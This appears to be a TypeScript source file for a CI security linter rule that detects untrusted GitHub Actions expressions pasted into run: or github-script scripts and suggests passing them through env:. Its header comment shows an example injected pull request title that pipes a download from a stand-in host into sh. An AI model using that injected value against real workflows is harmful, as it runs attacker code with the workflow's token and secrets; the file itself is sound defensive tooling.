import type { Rule } from '../types.ts';
import {
  type Job,
  type Step,
  type Taint,
  type Workflow,
  type YamlText,
  classifyCondition,
  compositeActionTriggers,
  exposureOf,
  jobGuard,
  strongerGuard,
  expressionsIn,
  parseExpression,
  taintsInText,
  taintsOf,
  workflowFor,
  workflowStanding,
} from './workflow.ts';

/**
 * `${{ }}` expressions that an attacker controls, pasted into a `run:` script
 * or an actions/github-script `script:`. GitHub substitutes the text before
 * the script runs, so a pull request titled `a"; curl evil | sh; "` runs that
 * command. Passing the value through `env:` and reading "$VAR" is the safe
 * form; `${{ env.VAR }}` is not, because it is substituted the same way.
 */

function suggestedEnvName(field: string): string {
  if (field === 'github.head_ref') return 'GITHUB_HEAD_REF';
  const parts = field.split('.').filter((p) => p !== '*' && p !== 'github' && p !== 'event');
  const tail = parts.slice(-2).join('_').toUpperCase().replace(/-/g, '_').replace(/^PULL_REQUEST_/, 'PR_');
  return tail || 'VALUE';
}

function envResolver(workflow: Workflow, jobEnv: Map<string, YamlText>, step: Step): (name: string) => Taint[] {
  return (name: string) => {
    const value = step.env.get(name) ?? jobEnv.get(name) ?? workflow.env.get(name);
    return value ? taintsInText(value.value) : [];
  };
}

export const expressionInjection: Rule = {
  meta: {
    id: 'ci/expression-injection',
    level: 'block',
    scope: 'file',
    title: 'Untrusted input interpolated into a workflow script',
    summary:
      'A `${{ }}` expression that an outsider controls (issue, pull request, and comment text, branch names, commit messages) placed directly in a `run:` script or an actions/github-script `script:`.',
    why: 'GitHub pastes the expression text into the script before it runs, so a crafted title or branch name runs as code with the workflow token and secrets. The Nx compromise of August 2025 started this way, from a pull request title in a pull_request_target workflow.',
    fix: 'Pass the value through `env:` (for example `TITLE: ${{ github.event.issue.title }}`) and use "$TITLE" in the script.',
    cwe: ['CWE-78', 'CWE-94'],
    owasp: ['A03:2025', 'A05:2025'],
    levels:
      'block when the workflow runs on events that carry secrets or a write token (issues, comments, pull_request_target, workflow_run, push, and reusable workflows), and for composite actions that such a workflow in the repository uses; warn when only fork-restricted pull_request events fill the value, for composite actions without a known caller, and for workflows outside the repository root .github/workflows. Expressions that no trigger of the workflow fills are ignored.',
    references: ['https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections'],
  },
  appliesTo: (file) => workflowStanding(file) !== 'skip',
  text(ctx) {
    const standing = workflowStanding(ctx.file);
    const workflow = workflowFor(ctx.file.path, ctx.text);
    if (!workflow) return;
    const firstError = workflow.errors[0];
    if (firstError) ctx.unreadable(`YAML error on line ${firstError.line}, so GitHub will not run it`);
    if (!ctx.text.includes('${{')) return;
    const callerTriggers = workflow.kind === 'action' ? compositeActionTriggers(ctx.file.path, ctx.text, ctx.project) : null;
    const seen = new Set<string>();
    const check = (scalar: YamlText, where: 'run' | 'script', resolve: (name: string) => Taint[], job: Job, step: Step) => {
      // An event the job does not run for, or runs for only from same-repository branches, cannot inject.
      const runsOn = (event: string) => {
        const events = new Set([event]);
        const guard = strongerGuard(jobGuard(job, workflow.jobs, events), classifyCondition(step.if, events));
        return guard !== 'excluded' && guard !== 'trusted';
      };
      for (const at of expressionsIn(ctx.text, scalar, workflow.lineAt)) {
        const node = parseExpression(at.expr);
        const direct = taintsOf(node);
        const viaEnv = direct.length > 0 ? [] : taintsOf(node, resolve);
        const taint = direct[0] ?? viaEnv[0];
        if (!taint) continue;
        const exposure = exposureOf(taint, workflow, callerTriggers, runsOn);
        if (exposure === 'none') continue;
        const shown = at.expr.replace(/\s+/g, ' ');
        const dedupe = `${at.line}:${shown}`;
        if (seen.has(dedupe)) continue;
        seen.add(dedupe);
        const level = exposure === 'high' && standing === 'normal' ? 'block' : 'warn';
        const source = direct.length > 0 ? `${shown}, which ${taint.who} controls` : `${shown}, which holds ${taint.field} (controlled by ${taint.who})`;
        const envName = suggestedEnvName(taint.field);
        const existingEnv = direct.length === 0 ? /^env\.([\w-]+)$/.exec(shown)?.[1] : undefined;
        let fix: string;
        if (where === 'script') {
          fix = existingEnv
            ? `Read process.env.${existingEnv} in the script instead of interpolating the expression.`
            : `Read the value from context.payload, or from process.env after passing it through env: (${envName}: \${{ ${taint.field} }}), instead of interpolating it.`;
        } else if (existingEnv) {
          fix = `Use "$${existingEnv}" in the script, in double quotes, instead of the expression.`;
        } else if (envName === 'GITHUB_HEAD_REF') {
          fix = 'Use the "$GITHUB_HEAD_REF" environment variable that GitHub sets, in double quotes, instead of the expression.';
        } else {
          fix = `Pass the value through env: (${envName}: \${{ ${taint.field} }}) and use "$${envName}" in the script, in double quotes.`;
        }
        ctx.report({
          line: at.line,
          level,
          message:
            where === 'run'
              ? `This run script interpolates ${source}, so the text is pasted into the script and runs as shell code.`
              : `This github-script script interpolates ${source}, so the text is pasted into the script and runs as JavaScript.`,
          fix,
          key: shown,
        });
      }
    };
    for (const job of workflow.jobs) {
      for (const step of job.steps) {
        const resolve = envResolver(workflow, job.env, step);
        if (step.run) check(step.run, 'run', resolve, job, step);
        const uses = step.uses?.value ?? '';
        const script = /^actions\/github-script@/i.test(uses) ? step.with.get('script') : undefined;
        if (script) check(script, 'script', resolve, job, step);
      }
    }
  },
};
